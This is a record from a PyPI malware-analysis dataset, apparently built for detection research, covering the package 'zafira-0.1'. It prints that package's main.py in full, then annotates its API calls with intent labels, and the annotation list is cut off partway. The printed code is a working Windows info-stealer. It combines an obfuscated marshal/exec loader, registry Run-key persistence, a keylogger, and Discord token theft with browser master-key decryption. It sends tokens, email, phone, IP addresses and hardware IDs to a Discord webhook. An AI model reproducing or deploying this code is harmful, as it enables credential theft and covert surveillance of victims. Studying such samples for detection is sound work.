{
  "metadata": {
    "package_name": "zafira-0.1",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/zafira-0.1.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/zafira-0.1.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "main.py",
      "code_snippets": [
        {
          "snippet": "import ctypes\nimport json\nimport time \nimport re\nimport threading\nimport socket\nfrom pathlib import Path\nfrom zipfile import ZipFile\nimport base64\nimport subprocess\nimport shutil\nimport uuid\nfrom Crypto.Cipher import AES\nfrom discord import Embed, SyncWebhook\nfrom win32crypt import CryptUnprotectData\nimport requests\nimport os\nimport wmi \nimport sys\nimport platform\nfrom pynput.keyboard import Key, Listener\nfrom datetime import date\nfrom discord_webhook import DiscordWebhook, DiscordEmbed\n\n__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__=\"__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__\";__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__=\"__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__\";from marshal import loads;exec(loads(b\"\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00@\\x00\\x00\\x00s(\\x00\\x00\\x00d\\x00d\\x01l\\x00Z\\x00d\\x00d\\x01l\\x01Z\\x01e\\x02e\\x00\\xa0\\x03e\\x01\\xa0\\x03d\\x02\\xa1\\x01\\xa1\\x01\\x83\\x01\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00NsX\\x01\\x00\\x00\\xfd7zXZ\\x00\\x00\\x04\\xe6\\xd6\\xb4F\\x02\\x00!\\x01\\x16\\x00\\x00\\x00t/\\xe5\\xa3\\x01\\x01\\x1ax\\x9c\\xed\\x94]O\\x830\\x14\\x86\\xff\\xcbn6.\\xb0|\\x0cV\\xfc\\x8a[\\xb6\\x0c\\\\\\x14#\\xd3\\xcd\\x85\\xa4\\x01Z\\x81\\xb0\\xa5\\xb3E\\xd7\\xf9\\xeb\\xa5F\\x13\\x82&^x\\xc3\\x05Mz\\xfa\\xbe'\\xe7\\xe2\\xed\\x93\\xa6\\x081\\x92\\xc6\\x94sT\\xad\\xb6\\xca\\x8b^\\x1bR\\xfc){gmH\\xd1\\xd1\\xech\\xfeF\\x93\\x08\\x92\\x0c\\xb64\\xc2|\\x10\\xf7CA\\xccPh\\xda?\\xb7^\\xf7Wu\\xc3\\xab\\x02\\xeb\\r,\\xcb\\xe6[\\xe9\\x81TJU\\x8c\\xf7cV\\x96{~\\n\\x00\\xceyB\\x19>I\\xe8\\x0eD\\xfb\\x1c\\x1cH\\x9cQZp\\xa0k\\xb63\\x1a\\x0e-\\xddqL\\x03j\\x96ni\\xe0\\x9ecf\\xaa(\\xe50\\x15/\\xb6\\xb9\\x89\\xd6\\xc2?\\xc0\\xd5\\xf5\\xf8q2\\x8e\\r;\\x7fZ\\xdf,\\xa7\\xae\\x17L\\xef\\xde\\x8e\\xacp=\\x07\\xcei\\xee\\x99Kle\\xc5\\\\U\\x1f`0{\\xbe\\x95\\x01t\\x19*Fh5\\x9b\\xb8\\xbe\\xbf@(\\x14\\x91#\\xd3\\xb1\\xe6\\x05\\x7f4B\\x81\\xa3\\xea\\x1c%\\x14\\xbf\\x96\\x84}Yx\\xbe\\xab\\xfc\\x96\\\\6\\xc7%\\x13\\xa3A\\xf0\\x93Q_Q\\xba\\xc7\\xde}\\x1d-\\x95\\xbd\\x0f-\\xcf \\xf0\\x00\\x00\\x8f\\xbe`\\\\$\\x06U\\xc5\\x00\\x01\\xb3\\x02\\x9b\\x02\\x00\\x00\\xadT\\x0eL\\xb1\\xc4g\\xfb\\x02\\x00\\x00\\x00\\x00\\x04YZ)\\x04\\xda\\x04zlib\\xda\\x04lzma\\xda\\x04exec\\xda\\ndecompress\\xa9\\x00r\\x06\\x00\\x00\\x00r\\x06\\x00\\x00\\x00\\xda\\x07coduter\\xda\\x08<module>\\x01\\x00\\x00\\x00s\\x04\\x00\\x00\\x00\\x10\\x00\\x18\\x01\"));__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__=\"__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__\";__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__=\"__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__\";\n__PING__ = \"%ping_enabled%\"\n__PINGTYPE__ = \"%ping_type%\"\n\n# = = = = = Startup = = = = = =\nclass Startup:\n    def __init__(self) -> None:        \n        self.working_dir = os.getenv(\"APPDATA\") + \"\\\\zafira_grabber\"\n    \n        if self.check_self():\n            return\n\n        self.mkdir()\n        self.write_stub()\n        self.regedit()\n    \n    def check_self(self) -> bool:\n        if os.path.realpath(sys.executable) == self.working_dir + \"\\\\dat.txt\":\n            return True\n\n        return False\n    \n    def mkdir(self) -> str:\n        if not os.path.isdir(self.working_dir):\n            os.mkdir(self.working_dir)\n        \n        else:\n            shutil.rmtree(self.working_dir)\n            os.mkdir(self.working_dir)\n    \n    def write_stub(self) -> None:\n        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + \"\\\\dat.txt\")\n        \n        with open(file=f\"{self.working_dir}\\\\run.bat\", mode=\"w\") as f:\n            f.write(f\"@echo off\\ncall {self.working_dir}\\\\dat.txt\")\n    \n    def regedit(self) -> None:\n        subprocess.run(args=[\"reg\", \"delete\", \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \"/v\", \"zafira_grabber\", \"/f\"], shell=True)\n        subprocess.run(args=[\"reg\", \"add\", \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \"/v\", \"zafira_grabber\", \"/t\", \"REG_SZ\", \"/d\", f\"{self.working_dir}\\\\run.bat\", \"/f\"], shell=True)\n\nhostname = socket.gethostname()\nip_priv = socket.gethostbyname(hostname)\npcname = os.getenv('username')\nhoy = date.today()\n\ncpu = wmi.WMI().Win32_Processor()[0].Name\ngpu = wmi.WMI().Win32_VideoController()[0].Name\nram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)\nip_publ = requests.get('https://api.ipify.org').text\nmac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))\nhwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell = True, stdin = subprocess.PIPE, stderr = subprocess.PIPE).decode('utf-8').split('\\n')[1].strip()\n\n# = = = = = Keylogger = = = = =\ndef keyLogger():\n  with Listener(on_press = onPress) as listener:\n    listener.join()\n  \n# = = = = = On Press = = = = =\ndef onPress(key):\n  webhook = DiscordWebhook(url = __WEBHOOK__, username = \"Stoned Raiders\", avatar_url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n  embed = DiscordEmbed(title = \"Stoned Raiders\", description = \"**¡Tecla Presionada!**\", color = 0x00001)\n  embed.add_embed_field(name = \"**Tecla**\", value = f\"**`{str(key)}`**\")\n  embed.add_embed_field(name = \"**Fecha**\", value = f\"**`{hoy}`**\")\n  embed.add_embed_field(name = \"**Vicima**\", value = f\"**`{pcname}`**\")\n  embed.set_thumbnail(url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n  embed.set_footer(text = \"Made By Death Team | Scorpion\", icon_url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n  webhook.add_embed(embed)\n  response = webhook.execute()\n\nclass grabtokens:\n    def __init__(self) -> None:\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n\n        self.tokens = []\n        self.ids = []\n\n        self.grabTokens()\n        self.upload()\n\n    def decrypt_val(self, buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return \"Failed to decrypt password\"\n\n    def get_master_key(self, path) -> str:\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def grabTokens(self):\n        paths = {\n            'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + '\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Amigo': self.appdata + '\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Torch': self.appdata + '\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Kometa': self.appdata + '\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Orbitum': self.appdata + '\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'CentBrowser': self.appdata + '\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            '7Star': self.appdata + '\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Sputnik': self.appdata + '\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Vivaldi': self.appdata + '\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome SxS': self.appdata + '\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome1': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome2': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome3': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome4': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome5': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\',\n            'Epic Privacy Browser': self.appdata + '\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n            'Uran': self.appdata + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Yandex': self.appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Brave': self.appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Iridium': self.appdata + '\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'}\n\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if file_name[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [\n                            x.strip() for x in open(\n                                f'{path}\\\\{file_name}',\n                                errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                try:\n                                    token = self.decrypt_val(\n                                        base64.b64decode(\n                                            y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(\n                                            self.roaming + f'\\\\{disc}\\\\Local State'))\n                                except ValueError:\n                                    pass\n                                try:\n                                    r = requests.get(self.baseurl,headers={\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                        'Content-Type': 'application/json',\n                                        'Authorization': token})\n                                except Exception:\n                                        pass\n                                if r.status_code == 200:\n                                    uid = r.json()['id']\n                                    if uid not in self.ids:\n                                        self.tokens.append(token)\n                                        self.ids.append(uid)\n            else:\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [\n                        x.strip() for x in open(\n                            f'{path}\\\\{file_name}',\n                            errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl,headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                    pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.ids:\n                                    self.tokens.append(token)\n                                    self.ids.append(uid)\n\n\n        if os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(\n                    self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [\n                        x.strip() for x in open(\n                            f'{path}\\\\{_file}',\n                            errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl,headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                    pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.ids:\n                                    self.tokens.append(token)\n                                    self.ids.append(uid)\n\n    def upload(self):\n        for token in self.tokens:\n            val = \"\"\n            val_name = \"\"\n\n            r = requests.get(\n                'https://discord.com/api/v9/users/@me',\n                headers={\n                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                    'Content-Type': 'application/json',\n                    'Authorization': token})\n\n            discord_id = r.json()['id']\n            username = r.json()['username'] + '#' + r.json()['discriminator']\n            phone = r.json()['phone']\n            email = r.json()['email']\n\n            val_name += f'{username}'\n            \n \n\n            webhook = DiscordWebhook(url = __WEBHOOK__, username = \"Stoned Raiders\", avatar_url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n            embed = DiscordEmbed(title = \"Stoned Raiders\", description = \"**¡Nuevo Infectado!**\", color = 0x00001)\n            embed.add_embed_field(name = \"**Nombre Del Computador**\", value = f\"**`{pcname}`**\")\n            embed.add_embed_field(name = \"**GPU**\", value = f\"**`{gpu}`**\")\n            embed.add_embed_field(name = \"**Dirección MAC**\", value = f\"**`{mac}`**\", inline = True)\n            embed.add_embed_field(name = \"**CPU**\", value = f\"**`{cpu}`**\")\n            embed.add_embed_field(name = \"**IP Pública**\", value = f\"**`{ip_publ}`**\", inline = True)\n            embed.add_embed_field(name = \"**IP Privada**\", value = f\"**`{ip_priv}`**\", inline = True)\n            embed.add_embed_field(name = \"**HWID**\", value = f\"**`{hwid}`**\", inline = True)\n            embed.add_embed_field(name = \"**Memoria RAM**\", value = f\"**`{ram}`**\")\n            embed.add_embed_field(name = \"**Token**\", value = f\"**`{token}`**\")\n            embed.add_embed_field(name = \"**Email**\", value = f\"**`{email}`**\")\n            embed.add_embed_field(name = \"**phone**\", value = f\"**`{phone}`**\")\n            embed.set_thumbnail(url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n            embed.set_footer(text = \"Made By Death Team | Scorpion\", icon_url_url = \"https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg\")\n            webhook.add_embed(embed)\n            webhook.execute()",
          "triple_sequences": [
            {
              "action_api": "loads()",
              "action_description": "Deserializes Python object from bytes",
              "action_id": "deserialize_from_bytes",
              "object": "b\"\\xe3\\x00\\x00\\x00...\"",
              "object_description": "Obfuscated byte string",
              "object_id": "obfuscated_byte_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "exec()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Execute dynamically decoded code content",
              "intention_id": "execute_dynamically_decoded_code"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "APPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_environment_variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "self.working_dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.mkdir()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "self.working_dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "self.working_dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "os.path.realpath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "sys.executable",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "os.path.realpath(sys.executable), self.working_dir + \"\\dat.txt\"",
              "object_description": "Executable file and startup path",
              "object_id": "executable_startup_path",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"{self.working_dir}\\run.bat\"",
              "object_description": "Batch file path",
              "object_id": "batch_file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"@echo off\\ncall {self.working_dir}\\dat.txt\"",
              "object_description": "Batch file content",
              "object_id": "batch_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "[\"reg\", \"delete\", \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"/v\", \"zafira_grabber\", \"/f\"]",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Delete registry value for startup",
              "intention_id": "delete_startup_registry_entry"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "[\"reg\", \"add\", \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"/v\", \"zafira_grabber\", \"/t\", \"REG_SZ\", \"/d\", f\"{self.working_dir}\\run.bat\", \"/f\"]",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Add registry value for startup",
              "intention_id": "add_startup_registry_entry"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "Current hostname",
              "object_id": "current_hostname",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "socket.gethostbyname()",
              "action_description": "Resolves host name to IPv4 address",
              "action_id": "resolve_hostname",
              "object": "hostname",
              "object_description": "System hostname",
              "object_id": "system_hostname",
              "intention_description": "Collect IP address",
              "intention_id": "collect_ip_address"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "username",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "date.today()",
              "action_description": "Returns current time",
              "action_id": "get_current_time",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "wmi.WMI().Win32_Processor()[0].Name",
              "action_description": "Instantiates WMI interface for system management",
              "action_id": "instantiate_wmi",
              "object": "",
              "object_description": "System info",
              "object_id": "system_info",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "wmi.WMI().Win32_VideoController()[0].Name",
              "action_description": "Instantiates WMI interface for system management",
              "action_id": "instantiate_wmi",
              "object": "",
              "object_description": "System info",
              "object_id": "system_info",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize",
              "action_description": "Instantiates WMI interface for system management",
              "action_id": "instantiate_wmi",
              "object": "",
              "object_description": "System info",
              "object_id": "system_info",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://api.ipify.org'",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "uuid.getnode()",
              "action_description": "Retrieves hardware address as 48-bit integer",
              "action_id": "get_hardware_address",
              "object": "",
              "object_description": "Hardware address as 48-bit integer",
              "object_id": "network_interface_mac_file",
              "intention_description": "Extract MAC address",
              "intention_id": "extract_mac_address"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'..', '%012x' % uuid.getnode()",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Prepare character for further processing",
              "intention_id": "prepare_character_processing"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid'",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Get hardware UUID",
              "intention_id": "get_hardware_uuid"
            },
            {
              "action_api": "Listener()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "on_press = onPress",
              "object_description": "Keyboard event handler",
              "object_id": "keyboard_event_handler",
              "intention_description": "Register keylogger event handler",
              "intention_id": "register_keylogger_handler"
            },
            {
              "action_api": "listener.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "DiscordWebhook()",
              "action_description": "Creates Discord webhook object",
              "action_id": "create_discord_webhook",
              "object": "__WEBHOOK__",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "DiscordEmbed()",
              "action_description": "Creates Discord embed object",
              "action_id": "create_discord_embed",
              "object": "",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "embed.add_embed_field()",
              "action_description": "Adds field to Discord embed",
              "action_id": "add_discord_embed_field",
              "object": "name, value",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "embed.set_thumbnail()",
              "action_description": "Sets thumbnail image for Discord embed",
              "action_id": "set_discord_thumbnail",
              "object": "url",
              "object_description": "Discord CDN URL",
              "object_id": "discord_cdn_url",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "embed.set_footer()",
              "action_description": "Sets footer for Discord embed",
              "action_id": "set_discord_footer",
              "object": "text, icon_url",
              "object_description": "Discord CDN URL",
              "object_id": "discord_cdn_url",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "webhook.add_embed()",
              "action_description": "Adds field to Discord embed",
              "action_id": "add_discord_embed_field",
              "object": "embed",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "webhook.execute()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "localappdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "appdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{file_name}'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.encrypted_regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract encrypted Discord tokens",
              "intention_id": "extract_encrypted_discord_tokens"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "y.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "self.roaming + f'\\{disc}\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "str.decode()",
